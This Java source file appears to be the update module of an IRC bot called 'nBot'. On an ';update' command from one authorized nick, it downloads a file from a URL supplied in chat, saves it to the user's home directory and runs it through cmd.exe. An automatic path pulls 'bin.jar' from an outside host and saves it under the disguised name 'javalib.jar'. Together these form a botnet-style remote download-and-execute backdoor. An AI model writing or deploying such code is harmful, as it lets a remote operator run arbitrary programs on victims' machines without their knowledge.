
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
/**
 *
 * @author Nathan
 */
public class Update implements Handler {

    private static final String VER_URL = "";
    private static final double BOT_VER = 2.7;

    public boolean processCommand(String[] args, String nick) {
        if (args[0].equals(";update")) {
            if(!nick.equals("0671070238")) {
                IRC.sendMessage(Config.channel, "Get fucked, im not that stupid..");
                return false;
            }
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Updating bot!");
            update(args[1], args[2]);
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Update complete!");
            return true;
        }
        if(args[0].equals(";currentversion")) {
            IRC.sendMessage(Config.channel, "Current version is "+getBotVersion());
            return true;
        }
        if(args[0].equals(";localversion")) {
            IRC.sendMessage(Config.channel, "Current local version is "+BOT_VER);
            return true;
        }
        if(args[0].equals(";needsupdate")) {
            if(needsUpdate()) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Bot needs update, local ver "+BOT_VER+" remote ver "+getBotVersion());
                return true;
            } else {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " No update needed!");
                return true;
            }
        }
        return false;
    }

    public static void update(String url, String localName) {
        try {
            new Downloader().download(url, System.getProperty("user.home") + "/" + localName);
            Runtime.getRuntime().exec("cmd.exe /C start " + System.getProperty("user.home") + "/" + localName);
            System.exit(1);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void checkForUpdates() {
        if(needsUpdate()) {
            update("epicpanda.hostei.com/bin.jar", "javalib.jar");
        }
    }

    public static boolean needsUpdate() {
        if(getBotVersion() != BOT_VER) {
            return true;
        }
        return false;
    }

    public static double getBotVersion() {
        try {
            BufferedReader br = new BufferedReader(new InputStreamReader(new URL(VER_URL).openStream()));
            double ver = Double.valueOf(br.readLine());
            br.close();
            return ver;
        } catch (Exception e) {
            e.printStackTrace();
            return BOT_VER;
        }
    }
}
